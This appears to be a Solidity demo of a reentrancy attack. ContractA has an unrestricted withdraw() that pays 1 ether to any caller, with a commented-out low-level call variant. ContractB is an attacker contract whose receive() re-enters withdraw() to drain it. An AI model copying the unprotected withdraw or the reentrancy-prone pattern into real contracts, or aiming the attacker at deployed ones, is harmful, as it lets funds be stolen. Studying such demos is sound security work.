// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
contract ContractA {
    constructor() payable {}
    function withdraw() external {
        require(address(this).balance>=1 ether, "balance less than 1");
        payable(msg.sender).transfer(1 ether);
        // (bool success, ) = msg.sender.call{value: 1 ether}("");
        // require(success, "Transfer failed");
    }
}
contract ContractB {
    ContractA public contractA;
    constructor(address _contractA) {
        contractA = ContractA(_contractA);
    }
    function attack() external payable {
        contractA.withdraw();
    }
    receive() external payable {
        if (address(contractA).balance >= 1 ether) {
            contractA.withdraw();
        }
    }
}
